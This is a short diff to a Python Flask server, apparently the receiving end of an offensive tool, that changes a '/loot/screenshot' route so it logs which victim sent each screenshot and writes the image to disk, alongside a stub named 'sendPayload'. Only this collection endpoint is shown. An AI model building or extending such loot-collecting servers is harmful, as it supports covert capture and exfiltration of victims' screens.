@@ -52,6 +52,8 @@ def printHeader():
 #***************************************************************************
 # Support Functions
 
+# Need function to check session, return download directory
+
 
 
 #***************************************************************************
@@ -66,15 +68,10 @@ def sendPayload():
 
 
 # Capture screenshot
-@app.route('/loot/screenshot', methods=['POST'])
-def recordScreenshot():
+@app.route('/loot/screenshot/<identifier>', methods=['POST'])
+def recordScreenshot(identifier):
+    print("Received image from: " + identifier)
     image = request.data
-    #console.log("Received image size: " + str(len(image)))
-    #print("Received image: " + str(image))
-
-    # write the file
-    # Ok, this is writing out base64 string of data string. 
-    # Needs conversion
     print("Writing the file to disk...")
     with open ("./lootScreenshot.png", "wb") as binary_file:
         binary_file.write(image)
